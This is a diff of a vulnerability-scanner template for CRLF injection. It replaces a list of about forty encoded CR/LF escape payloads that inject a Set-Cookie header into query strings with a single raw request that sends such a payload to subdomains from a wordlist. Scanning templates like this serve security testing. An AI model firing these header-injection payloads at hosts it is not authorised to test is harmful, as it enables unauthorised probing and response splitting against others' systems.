@@ -1,69 +1,29 @@
-id: crlf-injection
-
+id: crlf-injection 4
 info:
-  name: CRLF Injection
-  author: pdteam
+  author: melbadry9,nadino,xElkomy
+  description: Improper sanitization of CRLF sequences.
+  name: CRLF injection
   severity: low
-  tags: crlf,dast
+  tags: crlf
+requests:
+- attack: sniper
+  matchers:
+  - part: header
+    regex:
+    - (?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)
+    type: regex
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /%0ASet-Cookie:crlfinjection=crlfinjection HTTP/1.1
 
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
+    Host: {{Subdomains}}
 
-    payloads:
-      escape:
-        - "%00"
-        - "%0a"
-        - "%0a%20"
-        - "%0d"
-        - "%0d%09"
-        - "%0d%0a"
-        - "%0d%0a%09"
-        - "%0d%0a%20"
-        - "%0d%20"
-        - "%20"
-        - "%20%0a"
-        - "%20%0d"
-        - "%20%0d%0a"
-        - "%23%0a"
-        - "%23%0a%20"
-        - "%23%0d"
-        - "%23%0d%0a"
-        - "%23%oa"
-        - "%25%30"
-        - "%25%30%61"
-        - "%2e%2e%2f%0d%0a"
-        - "%2f%2e%2e%0d%0a"
-        - "%2f..%0d%0a"
-        - "%3f"
-        - "%3f%0a"
-        - "%3f%0d"
-        - "%3f%0d%0a"
-        - "%e5%98%8a%e5%98%8d"
-        - "%e5%98%8a%e5%98%8d%0a"
-        - "%e5%98%8a%e5%98%8d%0d"
-        - "%e5%98%8a%e5%98%8d%0d%0a"
-        - "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d"
-        - "%u0000"
-        - "%u000a"
-        - "%u000d"
-        - "\r"
-        - "\r%20"
-        - "\r\n"
-        - "\r\n%20"
-        - "\r\n\t"
-        - "\r\t"
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
 
-    fuzzing:
-      - part: query
-        type: postfix
-        fuzz:
-          - "{{escape}}Set-Cookie:crlfinjection=crlfinjection"
+    Accept-Encoding: gzip, deflate
 
-    stop-at-first-match: true
-    matchers:
-      - type: regex
-        part: header
-        regex:
-          - '(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)'
+    Accept: */*
+
+    '
+  threads: 100
